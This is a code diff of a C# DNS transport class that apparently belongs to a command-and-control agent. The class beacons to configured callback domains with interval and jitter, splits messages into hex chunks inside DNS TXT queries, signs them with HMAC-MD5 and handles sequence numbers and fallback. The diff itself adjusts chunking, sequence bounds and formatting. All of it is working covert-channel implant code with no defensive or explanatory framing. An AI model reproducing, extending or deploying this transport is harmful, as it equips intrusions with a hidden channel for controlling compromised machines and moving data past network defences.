@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -71,7 +71,7 @@ namespace DnsTransport
 
         public DnsProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
-            CallbackInterval = int.Parse(data["callback_interval"]);
+	    CallbackInterval = int.Parse(data["callback_interval"]);
             CallbackJitter = int.Parse(data["callback_jitter"]);
             InitializationMessagePrefix = data["msginit"];
             DefaultMessagePrefix = data["msgdefault"];
@@ -81,8 +81,8 @@ namespace DnsTransport
             domains = data["callback_domains"].Split(',').ToList();
             this.next_msg_queue = new int[this.max_threads_conn];
             dnsRip = new DnsRip.Resolver(GetDnsAddress());
-            reset_init_all();
-            Agent.SetSleep(CallbackInterval, CallbackJitter);
+	        Agent.SetSleep(CallbackInterval, CallbackJitter);
+	        reset_init_all();
         }
 
         public void reset_init_all()
@@ -94,8 +94,8 @@ namespace DnsTransport
             this.is_init = false;
             this.cached_message_client = "";
             this.cached_message_server = "";
-            channel = initialize_ch_seq();
-            init_seq = initialize_ch_seq();
+            channel = initialize_ch_seq(0,200);
+            init_seq = initialize_ch_seq(200,400);
             this.dns_msg.Clear();
             initialize_Channel_conn();
 
@@ -180,17 +180,18 @@ namespace DnsTransport
             }
         }
 
-        public int initialize_ch_seq()
+        public int initialize_ch_seq(int i, int y)
         {
             Random rd_ch = new Random();
-            return rd_ch.Next(0, 200);
+            return rd_ch.Next(i, y);
         }
+
+
 
         public void initialize_Channel_conn()
         {
             while (is_init == false)
             {
-
                 send_init_request();
                 Agent.Sleep();
             }
@@ -211,7 +212,6 @@ namespace DnsTransport
             dFields["tsid"] = fields[0];
             dFields["bit_flip"] = fields[1];
             dFields["data"] = fields[2];
-
             return dFields;
         }
 
@@ -229,11 +229,7 @@ namespace DnsTransport
             var hmac = new HMACMD5(key);
             var hashBytes = hmac.ComputeHash(data);
             string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
-
-
             string message = DefaultMessagePrefix + "." + tsid + "." + random_message + "." + hmac_section + "." + get_random_domain_query();
-
-
             string result = "";
             try
             {
@@ -264,7 +260,6 @@ namespace DnsTransport
                     this.next_seq = seq;
                     this.init_seq = seq;
                     this.dns_msg.Clear();
-
                     reset_error_count();
                     return true;
                 }
@@ -282,6 +277,8 @@ namespace DnsTransport
 
         public void reset_cycle()
         {
+	    this.dns_msg.Clear();
+	    this.message_count = 0;
             while (true)
             {
                 check_fallback();
@@ -315,13 +312,11 @@ namespace DnsTransport
             var hmac = new HMACMD5(key);
             var hashBytes = hmac.ComputeHash(data);
             string hmac_section = System.BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
-
             string message = InitializationMessagePrefix + "." + tsid + "." + random_message + "." + hmac_section + "." + get_random_domain_query();
-
             string result = "";
             try
             {
-                result = dnsRip.Resolve(message, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
+	    	result = dnsRip.Resolve(message, DnsRip.QueryType.TXT).First().Record.Replace("\"", "");
             }
             catch (Exception ex)
             {
@@ -340,7 +335,6 @@ namespace DnsTransport
                         this.channel = channel;
 
                     }
-
 
                     this.is_init = true;
                     this.bit_flip = this.agent_turn;
@@ -373,6 +367,7 @@ namespace DnsTransport
 
         public void setup_message_list(string message, string domain, bool is_cache)
         {
+	    int index = 0;
             IEnumerable<string> dns_msg_arr;
             //int maximum_size_messages = get_maximum_size_dns(sDefaultMessagePrefix, domain);
             int maximum_size_messages = 63;
@@ -382,18 +377,19 @@ namespace DnsTransport
                 var hexString = BitConverter.ToString(ba_str);
                 hexString = hexString.Replace("-", "");
                 dns_msg_arr = this.SplitByLength(hexString, maximum_size_messages);
+		foreach (var msg_chunk in dns_msg_arr)
+                {
+                    this.dns_msg[index] = msg_chunk;
+                    index = index + 1;
+                }
             }
             else
             {
                 dns_msg_arr = this.SplitByLength(message, maximum_size_messages);
-            }
-            int index = 0;
-            foreach (var msg_chunk in dns_msg_arr)
-            {
-                this.dns_msg[index] = msg_chunk;
-                index = index + 1;
-            }
-            this.end_seq = this.next_seq + this.dns_msg.Count;
+                this.dns_msg[index] = message;
+	    }
+            index = 0;
+            this.end_seq = this.next_seq + this.dns_msg.Count - 1;
             this.bit_flip = this.agent_turn;
         }
 
@@ -403,10 +399,7 @@ namespace DnsTransport
             {
 
                 int packet_pos = seq - this.init_seq;
-
-
                 this.dns_msg[packet_pos] = packet;
-
                 if (this.dns_msg.Count == this.message_count)
                 {
                     this.bit_flip = this.reset_turn;
@@ -422,7 +415,7 @@ namespace DnsTransport
             string result = "";
             try
             {
-                string message;
+                string message = "";
                 if (this.bit_flip == this.agent_turn)
                 {
                     if (this.dns_msg.ContainsKey(seq - this.init_seq) && is_cache == false)
@@ -434,11 +427,6 @@ namespace DnsTransport
                         if (is_cache == true)
                         {
                             message = this.dns_msg[0];
-                        }
-                        else
-                        {
-                            this.bit_flip = this.message_count_turn;
-                            return;
                         }
                     }
                 }
@@ -489,9 +477,9 @@ namespace DnsTransport
                             {
                                 if (this.next_seq < seq_resp)
                                 {
-                                    this.next_seq = seq_resp;
+                                    this.next_seq = seq_resp - 1;
                                 }
-                                if (seq_resp >= this.end_seq)
+                                if (seq_resp > this.end_seq)
                                 {
                                     this.bit_flip = this.message_count_turn;
                                 }
@@ -550,7 +538,7 @@ namespace DnsTransport
                 }
                 else
                 {
-                    for (int i = 0; i < this.max_threads_conn && seq + i < this.end_seq && this.bit_flip == this.agent_turn; i++)
+                    for (int i = 0; i < this.max_threads_conn && seq + i <= this.end_seq && this.bit_flip == this.agent_turn; i++)
                     {
                         check_fallback();
                         Thread dnsthread = new Thread(() => dnsquery(seq + i, domain, is_cache));
@@ -716,13 +704,9 @@ namespace DnsTransport
         {
             this.bit_flip = this.server_turn;
             init_next_msg_queue();
-            //Thread msgorganizer_thread = new Thread(() => message_organizer());
-            //msgorganizer_thread.Start();
             int starting_point = this.init_seq;
             while (this.bit_flip == this.server_turn)
             {
-                //setup next x threads ( x = max_threads_conn)
-                //
                 if (this.error_count_p2 >= this.MAX_ERROR_TOLERANCE_2)
                 {
                     throw new Exception("Fallback");
@@ -843,14 +827,13 @@ namespace DnsTransport
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
         {
-
             string sMsg = "";
             string payload = "";
             bool is_cache = false;
             string auxMsg = aux_serial.Serialize(message);
             if (auxMsg == this.cached_message_client)
             {
-                is_cache = true;
+		is_cache = true;
                 sMsg = this.cache_code;
             }
             else
@@ -861,7 +844,7 @@ namespace DnsTransport
             string result;
             int busyCount = 0;
             string domain = get_random_domain_query();
-            setup_message_list(sMsg, domain, is_cache);
+    	    setup_message_list(sMsg, domain, is_cache);
             int count = 0;
             while (true)
             {
